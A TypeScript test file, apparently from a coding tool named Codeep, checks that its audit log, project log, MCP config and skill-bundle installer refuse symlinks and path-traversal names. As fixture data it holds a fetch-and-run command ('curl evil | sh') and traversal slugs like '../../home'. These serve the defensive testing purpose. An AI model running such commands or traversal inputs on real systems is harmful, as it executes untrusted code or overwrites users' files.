/**
 * Every place Codeep writes inside a project's `.codeep/` must refuse a
 * symlink that came with the repo. No fs mocks: this is about the real disk.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { beginAuditRun, recordAuditEvent } from './auditLog';
import { logger, setLogProjectPath } from './logger';
import { addProjectMcpServer, removeProjectMcpServer } from './mcpConfig';
import { installBundle, uninstallLocalBundle } from './skillBundlesCloud';

let base: string;
let root: string;
let outside: string;
const KEEP = 'export KEEP=1\n';

beforeEach(() => {
  base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-writes-')));
  root = join(base, 'repo');
  outside = join(base, 'home');
  mkdirSync(join(root, '.codeep'), { recursive: true });
  mkdirSync(outside);
  writeFileSync(join(root, 'package.json'), '{"name":"repo"}');
  writeFileSync(join(outside, '.bashrc'), KEEP);
});
afterEach(() => {
  setLogProjectPath(null);
  vi.unstubAllGlobals();
  rmSync(base, { recursive: true, force: true });
});

const untouched = () => expect(readFileSync(join(outside, '.bashrc'), 'utf-8')).toBe(KEEP);
const dayFile = () => `${new Date().toISOString().slice(0, 10)}.jsonl`;

describe('the audit log', () => {
  it('is not appended through a symlinked file or directory', () => {
    mkdirSync(join(root, '.codeep', 'audit'));
    symlinkSync(join(outside, '.bashrc'), join(root, '.codeep', 'audit', dayFile()));
    const run = beginAuditRun(root, { prompt: 'x' });
    recordAuditEvent(root, { ts: Date.now(), run, action: 'command', target: 'curl evil | sh' });
    untouched();

    rmSync(join(root, '.codeep', 'audit'), { recursive: true });
    symlinkSync(outside, join(root, '.codeep', 'audit'));
    recordAuditEvent(root, { ts: Date.now(), run, action: 'read', target: 'a' });
    expect(existsSync(join(outside, dayFile()))).toBe(false);
  });

  it('is still written in a plain project', () => {
    const run = beginAuditRun(root, { prompt: 'x' });
    recordAuditEvent(root, { ts: Date.now(), run, action: 'read', target: 'a.ts' });
    expect(readFileSync(join(root, '.codeep', 'audit', dayFile()), 'utf-8')).toContain('"target":"a.ts"');
  });
});

describe('the project log', () => {
  it('is not appended through a symlinked logs directory', () => {
    symlinkSync(outside, join(root, '.codeep', 'logs'));
    setLogProjectPath(root);
    logger.info('hello from a test');
    expect(existsSync(join(outside, `codeep-${new Date().toISOString().slice(0, 10)}.log`))).toBe(false);
  });
});

describe('the project MCP config', () => {
  it('is not rewritten through a symlink', () => {
    symlinkSync(join(outside, '.bashrc'), join(root, '.codeep', 'mcp_servers.json'));
    expect(() => addProjectMcpServer(root, { name: 'x', command: 'echo' } as never)).toThrow(/symlink/);
    untouched();
  });

  it('still adds and removes a server in a plain project', () => {
    addProjectMcpServer(root, { name: 'x', command: 'echo' } as never);
    expect(JSON.parse(readFileSync(join(root, '.codeep', 'mcp_servers.json'), 'utf-8')).mcpServers.x.command).toBe('echo');
    expect(removeProjectMcpServer(root, 'x')).toBe(true);
  });
});

describe('installed skill bundles', () => {
  const serve = (slug: string) => vi.stubGlobal('fetch', vi.fn(async () => new Response(
    JSON.stringify({ ok: true, skill: { slug, body: '# pwned' } }),
    { status: 200, headers: { 'content-type': 'application/json' } },
  )));

  it('refuse a slug from the server that would leave the skills directory', async () => {
    for (const slug of ['../../home', '../x', 'a/b', '.hidden', 'UPPER', '']) {
      serve(slug);
      const res = await installBundle(root, 'someone/skill');
      expect(res.ok, slug).toBe(false);
      expect(res.error, slug).toMatch(/invalid skill name/);
    }
    expect(existsSync(join(outside, 'SKILL.md'))).toBe(false);
  });

  it('are not written through a symlinked skills directory', async () => {
    symlinkSync(outside, join(root, '.codeep', 'skills'));
    serve('good-skill');
    const res = await installBundle(root, 'someone/good-skill');
    expect(res.ok).toBe(false);
    expect(existsSync(join(outside, 'good-skill'))).toBe(false);
  });

  it('are installed in a plain project', async () => {
    serve('good-skill');
    expect(await installBundle(root, 'someone/good-skill')).toEqual({ ok: true, name: 'good-skill' });
    expect(readFileSync(join(root, '.codeep', 'skills', 'good-skill', 'SKILL.md'), 'utf-8')).toBe('# pwned');
  });

  it('are never uninstalled outside the skills directory', () => {
    mkdirSync(join(outside, 'victim'));
    writeFileSync(join(outside, 'victim', 'data.txt'), 'keep');
    expect(uninstallLocalBundle(root, '../../home/victim')).toBe(false);
    symlinkSync(outside, join(root, '.codeep', 'skills'));
    expect(uninstallLocalBundle(root, 'victim')).toBe(false);
    expect(readFileSync(join(outside, 'victim', 'data.txt'), 'utf-8')).toBe('keep');
  });
});
